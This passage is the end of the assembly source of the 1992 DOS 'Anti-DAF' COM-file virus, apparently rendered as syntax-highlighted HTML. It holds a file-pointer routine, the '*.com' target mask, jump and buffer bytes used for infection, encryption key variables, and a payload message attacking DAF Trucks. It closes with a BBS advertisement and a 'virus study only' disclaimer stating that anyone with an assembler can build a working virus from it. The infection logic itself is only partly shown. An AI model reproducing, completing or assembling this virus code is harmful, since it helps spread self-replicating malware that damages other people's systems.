</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">move_pointer</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
        
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">com_mask</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.com"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">lenght</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">jump</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">text</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc3">"The Anti-DAF virus"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DAF-TRUCKS Eindhoven"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Hugo vd Goeslaan 1"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Postbus 90063"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"5600 PR Eindhoven, The Netherlands"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"DAF sucks..."</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0"> 
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"(c) 1992 Dark Helmet &amp; The Virus Research Centre"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc3">"$"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">key1</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
</span><span class="sc5">key2</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
</span><span class="sc5">sleutel</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
</span><span class="sc5">last</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc0">

</span><span class="sc5">Anti_DAF</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">  </span><span class="sc5">dummy</span><span class="sc0">
</span><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=] For All Your H/P/A/V Files [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]    SysOp: Peter Venkman    [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;</span><span class="sc0">
</span><span class="sc1">; Around Among the General Public. It Will be Very Useful for Learning how   ;</span><span class="sc0">
</span><span class="sc1">; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;</span><span class="sc0">
</span><span class="sc1">; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;</span><span class="sc0">
</span><span class="sc1">; Experience can Turn it Into a far More Malevolent Program Than it Already  ;</span><span class="sc0">
</span><span class="sc1">; Is. Keep This Code in Responsible Hands!                                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;****************************************************************************;</span><span class="sc0">

</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴;</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴&gt; and Remember Don't Forget to Call &lt;컴컴컴컴컴컴컴컴컴;</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;컴컴컴컴컴;</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴;</span><span class="sc0">

</span></div></body>
</html>
